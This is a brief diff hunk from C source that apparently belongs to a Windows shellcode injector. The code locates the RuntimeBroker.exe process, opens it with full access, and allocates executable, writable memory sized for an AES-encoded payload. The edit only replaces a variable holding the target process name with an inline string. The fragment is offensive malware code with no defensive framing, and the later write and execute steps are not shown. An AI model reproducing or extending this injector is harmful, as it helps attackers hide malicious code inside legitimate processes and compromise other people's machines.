@@ -46,9 +46,9 @@ int main() {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     
     Process32First(snapshot, &pe32);
-    const char *tarproces = "RuntimeBroker.exe";
+    
     while(Process32Next(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, tarproces) == 0){
+       if (strcmp(pe32.szExeFile, "RuntimeBroker.exe") == 0){
               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               Sleep(2000);
               LPVOID CAMLO = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
